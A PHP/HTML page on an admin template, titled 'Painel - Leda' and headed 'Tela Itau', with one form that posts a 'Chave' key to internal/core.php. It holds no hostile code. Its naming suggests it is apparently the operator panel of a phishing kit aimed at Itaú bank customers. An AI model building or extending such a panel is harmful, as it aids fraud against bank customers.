<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en" class="h-100">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="keywords" content="admin, dashboard" />
    <meta name="author" content="DexignZone" />
    <meta name="robots" content="index, follow" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Painel - Leda</title>
    <link
      href="vendor/bootstrap-select/dist/css/bootstrap-select.min.css"
      rel="stylesheet"
    />
    <link href="css/style.css" rel="stylesheet" />
  </head>

  <body class="vh-100">
    <div class="authincation h-100">
      <div class="container h-100">
        <div class="row justify-content-center h-100 align-items-center">
          <div class="col-md-6">
            <div class="authincation-content">
              <div class="row no-gutters">
                <div class="col-xl-12">
                  <div class="auth-form">
                    <div class="text-center mb-3">
                      <a href="index.html"> </a>
                    </div>
                    <h4 class="text-center mb-4">Tela Itau</h4>
                    <form
                      action="internal/core.php" method="POST"
                    >
                    <input type="hidden" name="form1" value="form1">
                      <div class="form-group">
                        <label class="mb-1"><strong>Chave</strong></label>
                        <input
                          type="text"
                          class="form-control"
                          value=""
                          placeholder="Chave..."
                          name="chave"
                        />
                      </div>
                      <div
                        class="form-row d-flex justify-content-between mt-4 mb-2"
                      ></div>
                      <div class="text-center">
                        <button type="submit" class="btn btn-primary btn-block">
                          Verificar
                        </button>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <script src="vendor/global/global.min.js"></script>
    <script src="vendor/bootstrap-select/dist/js/bootstrap-select.min.js"></script>
    <script src="js/custom.min.js"></script>
    <script src="js/deznav-init.js"></script>
    <script src="js/demo.js"></script>
  </body>

</html>
